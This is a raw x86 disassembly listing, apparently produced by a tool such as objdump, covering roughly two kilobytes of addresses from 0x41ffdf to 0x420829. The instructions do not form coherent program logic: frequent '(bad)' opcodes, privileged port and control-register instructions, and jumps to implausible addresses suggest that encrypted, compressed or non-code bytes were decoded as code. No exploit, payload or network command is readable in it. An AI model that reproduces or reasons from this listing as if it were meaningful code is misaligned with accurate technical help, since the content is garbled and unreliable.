  41ffdf:	add    eax,DWORD PTR [esi+ebx*8]
  41ffe2:	jmp    0x4956a346
  41ffe7:	push   edi
  41ffe8:	aas    
  41ffe9:	in     al,0x7c
  41ffeb:	jne    0x42003c
  41ffed:	pop    ebp
  41ffee:	leave  
  41ffef:	fstp   TBYTE PTR [esi+0x1c]
  41fff2:	or     DWORD PTR gs:[ecx],edx
  41fff5:	pop    DWORD PTR [edi-0x79384165]
  41fffb:	(bad)  
  41fffc:	cmp    ebp,DWORD PTR [ecx]
  41fffe:	loopne 0x420027
  420000:	fcmove st,st(3)
  420002:	aad    0xb2
  420004:	and    BYTE PTR [edx+0x47],ah
  420007:	cmp    edi,DWORD PTR [ebp-0x2c037952]
  42000d:	inc    esi
  42000e:	and    eax,0xe7e06ec
  420013:	mov    bh,0xae
  420015:	mov    edx,0xc0562cec
  42001a:	icebp  
  42001b:	es xchg ebp,edx
  42001e:	jecxz  0x42006d
  420020:	rcr    DWORD PTR [edi],cl
  420022:	sti    
  420023:	inc    ebx
  420024:	fnstsw WORD PTR [ecx]
  420026:	lods   al,BYTE PTR ds:[esi]
  420027:	mov    ch,0xfe
  420029:	inc    esp
  42002a:	cld    
  42002b:	sub    dh,BYTE PTR [eax-0x37d0ab0e]
  420031:	xor    BYTE PTR [eax-0x1689d1ed],dl
  420037:	xor    eax,0x277b70d6
  42003c:	cmp    eax,0xd1126e71
  420041:	sbb    DWORD PTR [esi],0x8e970735
  420047:	add    BYTE PTR [ebx+0x5786eb5f],dl
  42004d:	dec    edx
  42004e:	inc    ecx
  42004f:	into   
  420050:	lea    edi,[ebx]
  420052:	or     DWORD PTR [ebx+0x7f99d852],0x25e96df9
  42005c:	addr16 xchg ebp,eax
  42005e:	jo     0x42009c
  420060:	adc    al,0x58
  420062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420063:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420065:	mov    bh,0x33
  420067:	cmc    
  420068:	dec    edi
  420069:	jmp    0xd6a86130
  42006e:	mov    ecx,0x106bd02b
  420073:	test   DWORD PTR [esi+edx*1-0x2],ebp
  420077:	leave  
  420078:	dec    esp
  420079:	(bad)  
  42007b:	ins    BYTE PTR es:[edi],dx
  42007c:	and    al,0x41
  42007e:	mov    edx,0x1b10b82b
  420083:	mov    bh,0xa9
  420085:	push   ebp
  420086:	or     al,0xef
  420088:	stos   BYTE PTR es:[edi],al
  420089:	sub    eax,0x4dbbe0cb
  42008e:	ja     0x420080
  420090:	outs   dx,DWORD PTR ds:[esi]
  420091:	iret   
  420092:	pushf  
  420093:	inc    edi
  420094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420095:	test   DWORD PTR [ecx],ebx
  420097:	in     eax,dx
  420098:	(bad)  
  420099:	adc    DWORD PTR [ebx-0x22e4bd2e],eax
  42009f:	mov    ah,0x45
  4200a1:	fld    QWORD PTR gs:[eax-0x3a]
  4200a5:	push   es
  4200a6:	dec    ecx
  4200a7:	out    dx,al
  4200a8:	xchg   DWORD PTR [eax],edx
  4200aa:	ss repnz mov dh,0x5d
  4200ae:	adc    al,0xa0
  4200b1:	enter  0x8ffb,0xc2
  4200b5:	in     eax,dx
  4200b6:	test   al,bh
  4200b8:	stos   DWORD PTR es:[edi],eax
  4200b9:	pop    edi
  4200ba:	bound  ebp,QWORD PTR ds:0xa2432199
  4200c0:	mov    esp,0x3c16c6bf
  4200c5:	cli    
  4200c6:	ja     0x4200e9
  4200c8:	mov    esp,0x4298381d
  4200cd:	sbb    edx,ebp
  4200cf:	enter  0x1a02,0xc2
  4200d3:	mov    eax,0x930d5dff
  4200d8:	xchg   DWORD PTR [edx+0x8],esp
  4200db:	shr    DWORD PTR es:[ebp+edx*1+0x3],1
  4200e0:	loop   0x420074
  4200e2:	mov    ecx,0x3668ef0a
  4200e7:	or     DWORD PTR [ecx-0xb707d3b],ebp
  4200ed:	ins    DWORD PTR es:[edi],dx
  4200ee:	adc    al,0x7b
  4200f0:	jle    0x420167
  4200f2:	sbb    ah,BYTE PTR [ecx-0x79]
  4200f5:	pop    ds
  4200f6:	jb     0x4200c2
  4200f8:	nop
  4200f9:	(bad)  
  4200fa:	and    edx,DWORD PTR [ebx]
  4200fc:	xchg   ebp,eax
  4200fd:	je     0x4200bd
  4200ff:	inc    eax
  420100:	shr    BYTE PTR [ebx],1
  420102:	and    eax,0x2432cd01
  420107:	xchg   ebp,eax
  420108:	pop    ds
  420109:	sub    ch,BYTE PTR [ecx-0x546b6b1c]
  42010f:	fld    QWORD PTR [esi]
  420111:	cwde   
  420112:	and    DWORD PTR [eax-0x4e1e4339],edx
  420118:	xor    edx,DWORD PTR [esi]
  42011a:	mov    ecx,0xb95c36dc
  42011f:	add    ecx,DWORD PTR [esi+0x54]
  420122:	out    dx,eax
  420123:	mov    edx,0xed323a01
  420128:	push   ebp
  420129:	imul   ebp,edx,0xcd655cb1
  42012f:	bound  esp,QWORD PTR ds:0xf418debf
  420135:	test   DWORD PTR [ebx+0xb],0x1e21c2bf
  42013c:	jmp    0x420103
  42013e:	jb     0x420136
  420140:	push   ss
  420141:	xor    DWORD PTR [eax+0x60],esi
  420144:	lahf   
  420145:	mov    edi,0xc4c363dc
  42014a:	fld    TBYTE PTR [ecx-0x6fec99c5]
  420150:	std    
  420151:	aam    0x19
  420153:	les    ebp,FWORD PTR [edx+0x5e]
  420156:	sub    ebp,eax
  420158:	adc    DWORD PTR [edi],esp
  42015a:	fdiv   QWORD PTR [edi]
  42015c:	jno    0x4200fc
  42015e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015f:	bound  ebp,QWORD PTR [esi]
  420161:	shl    ebp,1
  420163:	mov    eax,ds:0x1b9ba757
  420168:	call   0xa96c64bd
  42016d:	cs push edi
  42016f:	add    DWORD PTR [eax],0x1483e44b
  420175:	push   ebp
  420176:	inc    edx
  420177:	mov    dl,0x91
  420179:	adc    DWORD PTR [ebx+eax*1+0x49],edi
  42017d:	icebp  
  42017e:	dec    edx
  42017f:	xor    DWORD PTR [eax+edx*4-0x50d49a42],0x1420a4fc
  42018a:	cmp    eax,0x7a68bef7
  42018f:	retf   0x9da8
  420192:	adc    edi,esp
  420194:	jle    0x4201c7
  420196:	aas    
  420197:	int    0x10
  420199:	push   cs
  42019a:	hlt    
  42019b:	(bad)  
  42019c:	retf   
  42019d:	popa   
  42019e:	push   ecx
  42019f:	add    DWORD PTR [ebp+0x173088b1],ebp
  4201a5:	or     eax,0xd2085a92
  4201aa:	sub    al,dl
  4201ac:	mov    BYTE PTR [edi+0xf974828],al
  4201b2:	int    0xc9
  4201b4:	sub    BYTE PTR [esi+0x59],ch
  4201b7:	mov    eax,0x6ca2a99b
  4201bc:	push   esi
  4201bd:	dec    edi
  4201be:	pop    ss
  4201bf:	out    dx,eax
  4201c0:	out    dx,al
  4201c1:	push   ebp
  4201c2:	xchg   esp,eax
  4201c3:	(bad)  
  4201c4:	jmp    0xabf3:0x4e18a880
  4201cb:	push   ecx
  4201cc:	mov    ecx,DWORD PTR [esi-0x38]
  4201cf:	mov    ch,0xdb
  4201d1:	cmp    ebx,DWORD PTR [edx+0x4b]
  4201d4:	and    al,0x99
  4201d6:	mov    ah,0xc6
  4201d8:	push   edi
  4201d9:	xor    esp,edx
  4201db:	repnz xchg ebx,eax
  4201dd:	daa    
  4201de:	(bad)  
  4201df:	jl     0x4201fe
  4201e1:	jne    0x420183
  4201e3:	dec    esi
  4201e4:	and    dl,BYTE PTR [edx+eax*1-0x2328c46]
  4201eb:	ror    BYTE PTR [esi-0x3a436d2c],0x3f
  4201f2:	push   edi
  4201f3:	jns    0x420225
  4201f5:	cmp    al,BYTE PTR ds:0x997556bb
  4201fb:	gs mov dh,0xb1
  4201fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420200:	sub    dh,0x20
  420203:	jmp    0x420256
  420205:	cs cmp eax,0xb9a5ef49
  42020b:	shl    ch,0x66
  42020e:	in     eax,dx
  42020f:	pop    ebp
  420210:	mov    BYTE PTR [ecx+0x16],dl
  420213:	popa   
  420214:	outs   dx,BYTE PTR gs:[esi]
  420216:	pushf  
  420217:	mov    ah,0xc0
  420219:	push   0x4190756a
  42021e:	mov    ebx,0x2c7c9960
  420223:	lods   al,BYTE PTR ds:[si]
  420225:	lds    eax,FWORD PTR [ebx-0x18]
  420228:	push   es
  420229:	aaa    
  42022a:	jns    0x4202a7
  42022c:	pop    ds
  42022d:	mov    eax,esi
  42022f:	ret    0x2df6
  420232:	in     eax,0xc5
  420234:	repz pop ebp
  420236:	ds or  edx,ecx
  420239:	jp     0x4202a7
  42023b:	sti    
  42023c:	lea    edx,[edi]
  42023e:	cmc    
  42023f:	xchg   edi,eax
  420240:	mov    es,WORD PTR ds:0x86e505b8
  420246:	sub    DWORD PTR [eax],edi
  420248:	xchg   ebx,eax
  420249:	rcr    al,0x0
  42024c:	or     al,0xfe
  42024e:	mov    ebx,DWORD PTR [ebp-0x55936e1d]
  420254:	add    BYTE PTR [ecx+0x1f],ch
  420257:	xor    BYTE PTR [eax+0x44f3c931],0x77
  42025e:	dec    ebp
  42025f:	std    
  420260:	xor    DWORD PTR [eax+0x3],0x67
  420264:	iret   
  420265:	inc    eax
  420266:	ins    DWORD PTR es:[edi],dx
  420267:	push   ebx
  420268:	je     0x4202b1
  42026a:	enter  0x1807,0xf1
  42026e:	dec    esp
  42026f:	outs   dx,DWORD PTR ds:[esi]
  420270:	popf   
  420271:	sbb    ch,BYTE PTR [ebx]
  420273:	jge    0x42021b
  420275:	in     al,0xd
  420277:	xchg   esp,eax
  420278:	shl    DWORD PTR [esi-0x42f766d6],cl
  42027e:	xchg   esi,eax
  42027f:	test   dh,al
  420281:	cld    
  420282:	test   BYTE PTR [esi],bl
  420284:	sub    dl,dh
  420286:	rcl    DWORD PTR [ebx+0x6a],0x31
  42028a:	shr    BYTE PTR [ecx],0x52
  42028d:	repnz sub al,0x51
  420290:	cmp    BYTE PTR [edi-0x75],0xaf
  420294:	fcom   st(4)
  420296:	xor    BYTE PTR gs:[edi+0x20c9c58b],0xa9
  42029e:	clc    
  42029f:	mov    dh,0x93
  4202a1:	aaa    
  4202a2:	pop    ecx
  4202a3:	pop    esp
  4202a4:	rcr    DWORD PTR [edx+0x15],cl
  4202a7:	rcr    DWORD PTR [ebp+0x7f2b22d6],cl
  4202ad:	leave  
  4202ae:	xchg   DWORD PTR [ebx-0x28],eax
  4202b1:	ds stc 
  4202b3:	mov    dl,0x74
  4202b5:	ficom  WORD PTR [esp+ebx*2-0x3d]
  4202b9:	mov    cr2,esi
  4202bc:	sar    cl,1
  4202be:	ret    0xfde7
  4202c1:	repz (bad) 
  4202c3:	adc    dh,BYTE PTR [esi+0xc6d1b40]
  4202c9:	mov    al,ds:0xd31432b2
  4202ce:	js     0x4202a1
  4202d0:	shl    DWORD PTR [edx],1
  4202d2:	dec    ebx
  4202d3:	fld    QWORD PTR [edi+0x6604f95d]
  4202d9:	mov    edi,0x76261f85
  4202de:	xchg   ecx,eax
  4202df:	or     BYTE PTR [ebx-0x2c1e48b7],dl
  4202e5:	push   ebp
  4202e6:	fcomp  QWORD PTR [esi+0x4580c4a3]
  4202ec:	sbb    dl,cl
  4202ee:	jl     0x420303
  4202f0:	fs push 0xc544abcd
  4202f6:	scas   eax,DWORD PTR es:[edi]
  4202f7:	xchg   edi,eax
  4202f8:	mov    bl,0x7c
  4202fa:	inc    eax
  4202fb:	les    edi,FWORD PTR [esi-0x7f]
  4202fe:	bound  ebp,QWORD PTR [edx]
  420300:	cli    
  420301:	pop    edi
  420302:	or     bh,cl
  420304:	jmp    0x7bfd:0xeb55d82b
  42030b:	push   edx
  42030c:	hlt    
  42030d:	adc    bl,bh
  42030f:	mov    bl,0x82
  420311:	push   eax
  420312:	addr16 test al,0x19
  420315:	outs   dx,DWORD PTR ds:[esi]
  420316:	das    
  420317:	adc    BYTE PTR [edx+0x11],0x47
  42031b:	and    al,0xce
  42031d:	jb     0x42034b
  42031f:	mov    edx,0x2b179954
  420324:	arpl   bx,cx
  420326:	inc    edx
  420327:	enter  0x2f99,0x35
  42032b:	jbe    0x420366
  42032d:	retf   
  42032e:	xor    al,0x7d
  420330:	cmp    DWORD PTR [edi],ecx
  420332:	and    BYTE PTR [eax],0xb0
  420335:	add    BYTE PTR [edi-0x41527488],dh
  42033b:	cli    
  42033c:	sub    eax,0xee74386b
  420341:	scas   al,BYTE PTR es:[edi]
  420342:	pop    edi
  420343:	adc    al,0x57
  420345:	das    
  420346:	pop    ss
  420347:	js     0x4202cb
  420349:	jge    0x42035c
  42034b:	mov    bl,0x6c
  42034d:	and    al,0xa1
  42034f:	fsub   QWORD PTR [esi-0x2b]
  420352:	push   es
  420353:	in     al,0x1a
  420355:	mov    ebp,0xac5eff18
  42035a:	add    edi,DWORD PTR [ebp+0x2]
  42035d:	mov    ah,0xeb
  42035f:	jae    0x420318
  420361:	or     ah,BYTE PTR [edi-0x2a]
  420364:	std    
  420365:	outs   dx,DWORD PTR ds:[esi]
  420366:	sahf   
  420367:	fmulp  st(0),st
  420369:	and    cl,BYTE PTR [ecx-0x39]
  42036c:	dec    edx
  42036d:	ja     0x420377
  42036f:	jnp    0x4203b9
  420371:	sub    BYTE PTR [ebx+0x48],al
  420374:	js     0x42030a
  420376:	scas   al,BYTE PTR es:[edi]
  420377:	mov    esp,edi
  420379:	push   ds
  42037a:	dec    ecx
  42037b:	fwait
  42037c:	icebp  
  42037d:	jmp    0x420398
  42037f:	sti    
  420380:	jnp    0x4203fc
  420382:	(bad)  
  420383:	sar    DWORD PTR [eax-0x62],cl
  420386:	in     al,0xec
  420388:	sti    
  420389:	mov    ebx,0xac5d0f45
  42038e:	pop    ss
  42038f:	les    esi,FWORD PTR ds:0x17f2a671
  420395:	dec    ecx
  420396:	cmp    al,0xef
  420398:	cmp    ah,al
  42039a:	xor    DWORD PTR [edx-0x76],esi
  42039d:	and    eax,0x5926eb80
  4203a2:	xor    BYTE PTR [ebx],al
  4203a4:	je     0x4203d5
  4203a6:	sub    bh,dh
  4203a8:	and    DWORD PTR [esi],0x3e47beba
  4203ae:	push   esi
  4203af:	cmp    eax,0xab4f85d9
  4203b4:	pop    ds
  4203b5:	push   edi
  4203b6:	pop    ds
  4203b7:	sahf   
  4203b8:	cwde   
  4203b9:	dec    esp
  4203ba:	(bad)  
  4203bb:	mov    gs,ecx
  4203bd:	imul   ebx,DWORD PTR [edi+ebp*4+0x5e],0x4d9e85ef
  4203c5:	mov    cl,BYTE PTR [ebx+eax*2]
  4203c8:	fisubr DWORD PTR ds:0xab3d16b3
  4203ce:	nop
  4203cf:	in     al,dx
  4203d0:	bound  ecx,QWORD PTR [edi+0x59]
  4203d3:	pusha  
  4203d4:	jmp    0x67e3:0x5edffbf0
  4203db:	jp     0x42042a
  4203dd:	popa   
  4203de:	(bad)  
  4203df:	icebp  
  4203e0:	fwait
  4203e1:	retf   
  4203e2:	adc    al,0xcf
  4203e4:	sbb    BYTE PTR [edi-0x48],cl
  4203e7:	daa    
  4203e8:	mov    DWORD PTR [eax+ecx*8+0x56943631],edx
  4203ef:	ret    0xa2d9
  4203f2:	adc    DWORD PTR [ebx+0x32d0a12d],esp
  4203f8:	inc    esp
  4203f9:	inc    esp
  4203fa:	or     DWORD PTR [edx+ecx*4],0xce7b8137
  420401:	clc    
  420402:	sbb    BYTE PTR [eax-0x41e54a81],dl
  420408:	mov    esi,0x23a67266
  42040d:	mov    al,ds:0x91357e59
  420412:	std    
  420413:	rcl    DWORD PTR [eax+0x78bf1694],cl
  420419:	mov    ah,BYTE PTR [edx]
  42041b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42041c:	cli    
  42041d:	cmp    esp,DWORD PTR [edi+0x5]
  420420:	icebp  
  420421:	pop    esi
  420422:	pusha  
  420423:	stos   BYTE PTR es:[edi],al
  420424:	(bad)  
  420425:	das    
  420426:	push   ss
  420427:	shl    DWORD PTR [ecx+0x4e],1
  42042a:	pop    edi
  42042b:	inc    ebp
  42042c:	clc    
  42042d:	jg     0x420495
  42042f:	daa    
  420430:	pushf  
  420431:	pop    ecx
  420432:	xor    DWORD PTR cs:[ebp-0x77fe9ce2],ebp
  420439:	fs push ss
  42043b:	cdq    
  42043c:	enter  0x444a,0xa5
  420440:	shl    DWORD PTR [ebx+0x29318b3],0xda
  420447:	add    ecx,eax
  420449:	int    0x55
  42044b:	or     dl,BYTE PTR [edx]
  42044d:	mov    bl,BYTE PTR [ecx-0x643bea89]
  420453:	lods   eax,DWORD PTR ds:[esi]
  420454:	cmc    
  420455:	iret   
  420456:	sub    edx,edi
  420458:	repz xchg esi,eax
  42045a:	pop    ss
  42045b:	pop    ds
  42045c:	bound  eax,QWORD PTR [eax-0x1b]
  42045f:	int    0x44
  420461:	inc    ecx
  420462:	mov    ch,0x1
  420464:	pop    edx
  420465:	jp     0x42047e
  420467:	retf   0x6c66
  42046a:	xor    esi,esi
  42046c:	jle    0x420466
  42046e:	and    BYTE PTR [esi+ebp*8],ch
  420471:	push   es
  420472:	iret   
  420473:	push   DWORD PTR [ebx-0x73]
  420476:	xchg   esp,eax
  420477:	xlat   BYTE PTR ds:[ebx]
  420478:	fild   WORD PTR ds:0xef4792bf
  42047e:	aam    0x99
  420480:	mov    esi,0x820bc1aa
  420485:	test   al,0xb2
  420487:	pop    ecx
  420488:	pop    ecx
  420489:	fs jno 0x42049c
  42048c:	xchg   edi,eax
  42048d:	cmp    al,0x62
  42048f:	cmc    
  420490:	pop    ebx
  420491:	or     esi,ebx
  420493:	xchg   ebp,eax
  420494:	int    0x45
  420496:	or     eax,DWORD PTR [eax]
	...
  420514:	adc    al,0xcb
  420516:	mov    bl,0x9a
  420518:	(bad)  
  420519:	cli    
  42051a:	cmp    eax,0x190968cf
  42051f:	mov    esi,DWORD PTR [edi-0x7f]
  420522:	mov    ds,WORD PTR ds:0x19db7
  420528:	imul   eax,DWORD PTR [edi],0x0
  42052b:	add    BYTE PTR [edi+0x26],ah
  42052e:	xor    ecx,DWORD PTR [ebx+0x1b]
  420531:	push   esp
  420532:	mov    eax,edx
  420534:	pop    ebp
  420535:	xchg   BYTE PTR [edx+0x4e8e8dd4],cl
  42053b:	retf   0x4f70
  42053e:	jg     0x420569
  420540:	inc    eax
  420541:	push   ecx
  420542:	push   ebx
  420543:	aaa    
  420544:	mov    ecx,0xd3d1f281
  420549:	xor    esp,DWORD PTR [esi-0x372d67ad]
  42054f:	xlat   BYTE PTR ds:[ebx]
  420550:	ja     0x42055a
  420552:	stos   DWORD PTR es:[edi],eax
  420553:	adc    DWORD PTR [eax],0xffffffc4
  420556:	stc    
  420557:	mov    ebp,0xa791d04a
  42055c:	bound  eax,QWORD PTR [ecx-0x7fb0777d]
  420562:	arpl   WORD PTR [ebx],si
  420564:	sbb    esi,ebp
  420566:	jmp    0x422d:0xeebaa3ec
  42056d:	nop
  42056e:	and    eax,0xf321ddd2
  420573:	adc    BYTE PTR [ebp-0x66b2b4d2],cl
  420579:	int    0x70
  42057b:	mov    ?,WORD PTR [eax]
  42057d:	cmp    cl,bl
  42057f:	scas   eax,DWORD PTR es:[edi]
  420580:	imul   esi,ebp,0x1d
  420583:	lods   al,BYTE PTR ds:[esi]
  420584:	stos   BYTE PTR es:[edi],al
  420585:	aam    0x8e
  420587:	fidivr WORD PTR [edi]
  420589:	es lock enter 0xc6f,0xad
  42058f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420590:	push   ebx
  420591:	(bad)  
  420593:	and    al,0xfd
  420595:	sar    al,1
  420597:	in     eax,dx
  420598:	fdiv   QWORD PTR [ecx+0x2e2daa2]
  42059e:	xor    al,0xfe
  4205a0:	and    DWORD PTR [eax],ecx
  4205a2:	adc    edi,DWORD PTR [edi+0x40e0b8c7]
  4205a8:	rol    BYTE PTR [ebp-0x6a],cl
  4205ab:	scas   eax,DWORD PTR es:[edi]
  4205ac:	inc    esp
  4205ad:	inc    ebx
  4205ae:	add    bl,cl
  4205b0:	push   ds
  4205b1:	rcr    dh,cl
  4205b3:	ja     0x420615
  4205b5:	in     eax,0x0
  4205b7:	rol    DWORD PTR [eax],cl
  4205b9:	test   DWORD PTR [eax+esi*4-0x5018624d],ebp
  4205c0:	cmp    ebp,ecx
  4205c2:	call   0x88904d71
  4205c7:	shl    al,1
  4205c9:	ja     0x4205fc
  4205cb:	repz sbb esi,DWORD PTR [eax+0x27]
  4205cf:	rcl    BYTE PTR [eax],0x38
  4205d2:	inc    edx
  4205d3:	in     eax,dx
  4205d4:	or     eax,0x49158029
  4205d9:	push   ds
  4205da:	xchg   DWORD PTR ds:0x8fe05041,ebx
  4205e0:	dec    ebp
  4205e1:	jbe    0x420655
  4205e3:	mov    cl,0x3c
  4205e5:	aad    0xa9
  4205e7:	mov    ecx,0x42ea9617
  4205ec:	cmp    cl,BYTE PTR [edi+ecx*2+0x3ce5b979]
  4205f3:	mov    BYTE PTR [edi],bl
  4205f5:	call   FWORD PTR [ebp-0x56]
  4205f8:	inc    ebx
  4205f9:	fwait
  4205fa:	retf   0x99a0
  4205fd:	pop    es
  4205fe:	cs aam 0x7c
  420601:	loop   0x42060d
  420603:	ins    DWORD PTR es:[edi],dx
  420604:	mov    ebp,0x800702a2
  420609:	fucom  st(5)
  42060b:	or     BYTE PTR [edi+0x4a],ah
  42060e:	push   es
  42060f:	inc    esp
  420610:	jb     0x42067b
  420612:	repnz push ebx
  420614:	inc    eax
  420615:	nop
  420616:	xor    BYTE PTR [esi],0x98
  420619:	xchg   edx,eax
  42061a:	cmp    eax,0x228df314
  42061f:	or     al,0x69
  420621:	mov    ch,0x55
  420623:	sar    BYTE PTR [ecx],1
  420625:	sbb    al,0x7a
  420627:	mov    bh,0x4d
  420629:	aas    
  42062a:	out    dx,eax
  42062b:	out    0x7e,al
  42062d:	add    esi,edi
  42062f:	dec    esp
  420630:	aaa    
  420631:	mov    bh,0x17
  420633:	jbe    0x420617
  420635:	jno    0x4205f6
  420637:	or     eax,DWORD PTR [ebx+0x63]
  42063a:	lods   al,BYTE PTR ds:[esi]
  42063b:	jnp    0x4206aa
  42063d:	dec    esp
  42063e:	dec    esi
  42063f:	stos   DWORD PTR es:[edi],eax
  420640:	cmp    bh,BYTE PTR [edx+edi*4+0x68529ae]
  420647:	xor    DWORD PTR [ebx-0x70],edi
  42064a:	pop    ebx
  42064b:	(bad)  
  42064c:	dec    edi
  42064d:	push   ds
  42064e:	cmp    DWORD PTR [edx+0x70c48e93],eax
  420654:	jbe    0x4206a0
  420656:	aad    0xed
  420658:	bound  ebp,QWORD PTR [eax]
  42065a:	stos   BYTE PTR es:[edi],al
  42065b:	call   0x29fdb58f
  420660:	inc    ebx
  420661:	add    eax,0x46c75fab
  420666:	push   0x35ff17b4
  42066b:	lds    ebp,FWORD PTR [ebp+eax*4-0x635b3794]
  420672:	cmp    BYTE PTR [edx],dl
  420674:	ret    0x398
  420677:	sub    BYTE PTR [ebp+0x56],cl
  42067a:	in     al,dx
  42067b:	dec    ebx
  42067c:	sbb    edx,0xffffffb5
  42067f:	jp     0x420642
  420681:	jg     0x420604
  420683:	sub    BYTE PTR [ebp+0x28303c82],bl
  420689:	shl    BYTE PTR [ecx],1
  42068b:	icebp  
  42068c:	std    
  42068d:	aam    0xa8
  42068f:	sti    
  420690:	jl     0x4206b1
  420692:	pop    ebx
  420693:	fsub   QWORD PTR [edx+0x31fe9f05]
  420699:	(bad)  
  42069a:	in     al,dx
  42069b:	dec    esi
  42069c:	outs   dx,DWORD PTR ds:[esi]
  42069d:	nop
  42069e:	ss mov ah,0xdf
  4206a1:	pushf  
  4206a2:	loope  0x420628
  4206a4:	pop    edi
  4206a5:	mov    esp,0x239562f2
  4206aa:	std    
  4206ab:	ja     0x420654
  4206ad:	es (bad) 
  4206af:	iret   
  4206b0:	int3   
  4206b1:	sub    BYTE PTR [eax-0x77],0x6c
  4206b5:	mov    ds:0xbf146bf0,eax
  4206ba:	sbb    ebp,DWORD PTR [ebx-0x2a]
  4206bd:	call   0xe914:0x27548c7d
  4206c4:	mov    dl,0xfb
  4206c6:	inc    eax
  4206c7:	or     DWORD PTR [eax],ebp
  4206c9:	(bad)  
  4206ca:	ror    BYTE PTR [ecx-0x3ad0e8d],cl
  4206d0:	je     0x420733
  4206d2:	mov    cl,0xc2
  4206d4:	inc    esp
  4206d5:	stos   DWORD PTR es:[edi],eax
  4206d6:	in     eax,dx
  4206d7:	scas   al,BYTE PTR es:[edi]
  4206d8:	call   0xcc7b:0xc7bd9697
  4206df:	icebp  
  4206e0:	push   cs
  4206e1:	or     eax,0x40dba5bd
  4206e6:	xchg   edi,eax
  4206e7:	jg     0x4206c9
  4206e9:	push   esi
  4206ea:	mov    BYTE PTR [edx],al
  4206ec:	jae    0x4206e1
  4206ee:	ror    cl,cl
  4206f0:	and    DWORD PTR [ecx-0x34dd43bb],edx
  4206f6:	sub    DWORD PTR [esi],0xffffffa6
  4206f9:	add    ch,BYTE PTR [eax]
  4206fb:	cmp    BYTE PTR [eax],cl
  4206fd:	push   edx
  4206fe:	jge    0x420779
  420700:	or     BYTE PTR [eax+0x391c0b39],cl
  420706:	jno    0x4206e6
  420708:	inc    eax
  420709:	mov    eax,0xde57c917
  42070e:	add    bl,BYTE PTR [edi+edi*2]
  420711:	aad    0x25
  420713:	adc    ebp,DWORD PTR cs:[edi]
  420716:	pusha  
  420717:	fdiv   st,st(5)
  420719:	ror    ebp,1
  42071b:	push   eax
  42071c:	out    dx,eax
  42071d:	dec    esp
  42071e:	mov    al,0x70
  420720:	xor    esp,DWORD PTR [esp+eax*1+0x3e]
  420724:	arpl   WORD PTR ds:[edx+0x53],cx
  420728:	inc    edi
  420729:	fnstenv [eax]
  42072b:	(bad)  
  42072c:	sbb    dh,BYTE PTR [edi-0x37b57744]
  420732:	and    ah,ah
  420734:	lea    ebx,[eax+0x172d384e]
  42073a:	push   eax
  42073b:	xor    eax,0x8eefd7aa
  420740:	sahf   
  420741:	dec    ecx
  420742:	jge    0x42077e
  420744:	aas    
  420745:	mov    dl,0x45
  420747:	hlt    
  420748:	or     BYTE PTR [ebx-0x2e4756d4],al
  42074e:	xor    edx,0xffffffb6
  420751:	mov    edi,0x7653d407
  420756:	je     0x4207bc
  420758:	and    ebp,ebp
  42075a:	sbb    eax,0x87cee047
  42075f:	lds    esp,FWORD PTR [esi]
  420761:	fadd   st(7),st
  420763:	into   
  420764:	and    eax,0xa37a1b0a
  420769:	sbb    BYTE PTR [edi+edi*1+0x4932301d],al
  420770:	gs inc esp
  420772:	imul   edx,DWORD PTR ds:[esi-0x294cacc8],0x108a9d0c
  42077d:	pop    esp
  42077e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42077f:	push   ebx
  420780:	mov    ecx,0x1b41152c
  420785:	dec    esp
  420786:	adc    eax,0x506afa09
  42078b:	pop    esp
  42078c:	jle    0x42074b
  42078e:	sub    bh,BYTE PTR [edi]
  420790:	out    0x6e,al
  420792:	push   cs
  420793:	pop    ss
  420794:	int    0x93
  420796:	hlt    
  420797:	ja     0x4207b6
  420799:	outs   dx,DWORD PTR ds:[esi]
  42079a:	test   BYTE PTR [ebp+0x3e],0x29
  42079e:	push   edx
  42079f:	arpl   si,di
  4207a1:	out    dx,eax
  4207a2:	push   esp
  4207a3:	dec    edi
  4207a4:	lahf   
  4207a5:	cmp    al,0xf8
  4207a7:	push   edx
  4207a8:	retf   
  4207a9:	sub    eax,DWORD PTR [ebx+0x39e886c7]
  4207af:	and    ebp,DWORD PTR [esp+eax*2+0x69]
  4207b3:	sbb    eax,0x31ff0804
  4207b8:	jb     0x420745
  4207ba:	or     BYTE PTR [ecx+0x59],ah
  4207bd:	test   edx,ebp
  4207bf:	jle    0x4207f3
  4207c1:	mov    ebx,0x4887afff
  4207c6:	xchg   edi,eax
  4207c7:	push   0x71
  4207c9:	mov    ebx,0x45dbe20d
  4207ce:	add    esp,DWORD PTR ds:0x4ae975bf
  4207d4:	xchg   edx,ecx
  4207d6:	out    dx,eax
  4207d7:	mov    bl,0x6b
  4207d9:	out    0x34,eax
  4207db:	push   esp
  4207dc:	stos   DWORD PTR es:[edi],eax
  4207dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207de:	xchg   ecx,eax
  4207df:	into   
  4207e0:	stos   BYTE PTR es:[edi],al
  4207e1:	sub    eax,0xecbf46d9
  4207e6:	outs   dx,BYTE PTR ds:[esi]
  4207e7:	cld    
  4207e8:	sbb    al,0x81
  4207ea:	cwde   
  4207eb:	loope  0x4207fe
  4207ed:	daa    
  4207ee:	jb     0x4207c2
  4207f0:	outs   dx,BYTE PTR ds:[esi]
  4207f1:	ja     0x42078e
  4207f3:	inc    ecx
  4207f4:	xor    ebx,esi
  4207f6:	sbb    bl,BYTE PTR [ebp+ebp*8+0x443695a3]
  4207fd:	aas    
  4207fe:	icebp  
  4207ff:	popf   
  420800:	popf   
  420801:	xor    bh,ah
  420803:	mov    ebp,DWORD PTR [ecx-0x36]
  420806:	and    al,BYTE PTR [ecx+0x3efba347]
  42080c:	scas   eax,DWORD PTR es:[edi]
  42080d:	iret   
  42080e:	div    DWORD PTR [ebx]
  420810:	rcl    dh,1
  420812:	rcl    BYTE PTR ds:0xf64103af,cl
  420818:	fcmovne st,st(0)
  42081a:	xchg   ebp,eax
  42081b:	enter  0x5e35,0x6a
  42081f:	addr16 jp 0x420874
  420822:	dec    ebx
  420823:	and    eax,0xe49ccd76
  420828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420829:	test   ecx,edi
